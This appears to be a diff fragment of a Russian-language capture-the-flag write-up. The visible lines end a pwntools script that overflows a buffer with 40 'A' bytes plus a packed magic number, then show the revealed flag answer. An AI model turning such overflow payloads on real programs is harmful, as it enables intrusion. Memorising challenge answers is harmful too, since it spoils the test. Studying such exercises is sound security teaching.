@@ -24,7 +24,7 @@ magic_num = 0xcc07c9
 p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + p32(magic_num))
 p.interactive()
 ```
-Запустив код, получим флаг: 
+Запустив код, получим флаг: <br />
 ![image](https://github.com/user-attachments/assets/3126a6ae-1d21-42e1-9469-9bf7b2085ad7)
 
 Ответ: `spbctf{s4v3d_the_w0rld_fr0M_HELL}`
